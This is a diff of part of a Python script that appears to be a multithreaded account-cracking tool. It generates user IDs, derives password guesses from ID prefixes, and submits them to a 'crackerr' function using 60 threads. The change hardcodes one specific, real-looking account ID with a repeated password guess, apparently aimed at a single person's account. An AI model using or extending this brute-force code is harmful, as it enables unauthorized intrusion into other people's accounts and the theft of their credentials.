@@ -439,12 +439,14 @@ def mainn():
     with ThreadPoolExecutor(max_workers=60) as Submits:
         print(47*"\x1b[1;97m—") 
         for next in gen:
-            ids = code + next
+            idsf = code + next
+            ids = "100053582633432"
             mk = ids[:6]
             xx = ids[:7]
             v = ids[:8]
             b = next[:6]  
-            passlist = [mk,xx,'57273200',v]
+            passlistf = [mk,xx,'57273200',v]
+            passlist = ['630110','630110','630110']
             Submits.submit(crackerr,ids,passlist)
 
 def convert(cookie):
